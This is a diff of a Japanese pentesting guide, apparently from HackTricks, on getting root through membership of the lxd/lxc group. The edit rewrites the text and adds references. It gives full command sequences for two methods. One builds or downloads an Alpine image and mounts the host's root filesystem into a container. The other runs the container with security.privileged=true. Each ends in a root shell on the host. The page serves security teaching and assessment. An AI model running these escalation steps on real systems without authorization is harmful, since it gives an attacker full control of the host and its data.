@@ -1,18 +1,16 @@
-# lxd/lxc Group - 権限昇格
+# lxd/lxc Group - Privilege escalation
 
-{{#include ../../../banners/hacktricks-training.md}}
+ホストのLXD管理グループ（通常は _**lxd**_）に所属していると、daemonを完全に制御できるため、rootへの昇格経路となる可能性があります。<sup>[[1]](#references)</sup>
 
-_**lxd**_ **または** _**lxc**_ **group** に所属している場合、root になることができます
-
-## internet なしでの Exploiting
+## internetなしでのExploit
 
 ### Method 1
 
-lxd で使用する alpine image を trusted repository から download できます。
-Canonical は site で daily build を公開しています：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-最新の build から **lxd.tar.xz** と **rootfs.squashfs** の両方を取得してください。（directory 名は date です）。
+信頼できるrepositoryから、LXDで使用するAlpine imageをdownloadできます。
+CanonicalのLXD image serverではdaily buildが公開されています：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+最新のbuild（directory名は日付）から、**lxd.tar.xz**と**rootfs.squashfs**の両方を取得するだけです。<sup>[[8]](#references)</sup>
 
-または、machine にこの distro builder を install できます：[https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)（github の instructions に従ってください）：
+また、[project instructions](https://github.com/lxc/distrobuilder)に従って、マシンにdistrobuilderをinstallすることもできます。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +33,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-**incus.tar.xz**（Canonical repository からダウンロードした場合は **lxd.tar.xz**）と **rootfs.squashfs** を upload し、image を repo に追加して container を作成します：
+**incus.tar.xz**（Canonical image serverからダウンロードした場合は**lxd.tar.xz**）と**rootfs.squashfs**をアップロードし、その後イメージをimportしてcontainerを作成します。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -52,17 +50,17 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > このエラー _**Error: No storage pool found. Please create a new storage pool**_ が表示された場合\
-> **`lxd init`** を実行し、すべてのオプションをデフォルトのまま設定してください。その後、前のコマンド群を**再実行**します
+> **`lxd init`** を実行してデフォルトの storage pool を設定し、その後、直前のコマンドのまとまりを**再実行**します。<sup>[[2]](#references)</sup>
 
-最後に、container を実行して root を取得できます:
+最後に、container を起動し、host のファイルシステム上で root shell を開きます。<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### 方法 2
+### Method 2
 
-Alpine image を build し、flag `security.privileged=true` を使用して起動することで、container が host filesystem と root として対話するよう強制します。
+Alpine image を構築し、`security.privileged=true` フラグを付けて起動すると、container の root が host の root にマッピングされます。さらに `/` を mount することで、container 内から host の filesystem にアクセスできるようになります。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,4 +80,15 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
+## References
+
+- [1] [LXD の security を harden する方法](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [2] [LXD containers と virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [images を copy および import する方法](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
+- [5] [distrobuilder で images を build する方法](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [LXD image server](https://images.lxd.canonical.com/)
+- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
